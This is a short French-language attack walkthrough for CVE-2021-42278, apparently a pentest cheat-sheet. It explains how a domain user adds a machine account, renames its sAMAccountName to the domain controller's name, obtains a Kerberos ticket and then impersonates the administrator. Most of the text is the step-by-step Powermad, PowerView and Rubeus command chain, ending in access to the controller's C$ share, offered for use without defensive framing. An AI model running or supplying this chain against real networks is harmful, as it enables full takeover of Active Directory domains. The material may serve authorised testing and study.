# CVE-2021-42278

Permet a un utilisateur authentifier sur le domaine de pouvoir ajouter une machine au domaine avec un mot de passe qui est defini que l'on connait.

De modifier le  l'attribut `SamAccountName` dans l'annuaire pour ursurper le nom du `DC` et en suite utiliser cette nouvelle machine avec le nom du DC quel ursurpe de l'utiliser pour genere un TGT pour dire `Nous sommes DC`.

Et en suite remettant le nom par defaut de la machine cette fois si communiquer avec le veritable DC en lui presentant notre TGT qui porte son propre nom en lui demandant un TGS et donc pour avoir la totaliter des droits sur le DC.



`Powermad.ps1` permet d'ajouter une machine au domaine et renommer l'attribut SamAccountName de la machine

`PowerView.ps1` permet de supprimer le SPN de la machine

Poste Client sur un domaine avec un utilisateur admin local

```sh
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount W10 -Domain dom.local -DomainController dc.dom.local -Verbose
```

```sh
Import-Module .\PowerView.ps1
Set-DomainObject "CN=W10,CN=Computer,DC=dom,DC=local" -Clear 'serviceprincipalename' -Verbose
```

```sh
Set-MachineAccountAttribute -MachineAccount W10 -Value "DC" -Attribute sAMAccountName -Verbose
```

```sh
Rubeus.exe asktgt /user:DC /password:Password123 /domain:dom.local /dc:dc.dom.local /nowrap
```

```sh
Set-MachineAccountAttribute -MachineAccount W10 -Value "W10" -Attribute sAMAccountName -Verbose
```

```sh
Rubeus.exe s4u /impersonateuse:Administrateur /nowrap /dc:dc.dom.local /self /altservice:CIFS/DC.dom.local /ptt /ticket:<ticket base 64>
```

```sh
klist
```

```sh
dir \\dc.dom.local\c$
```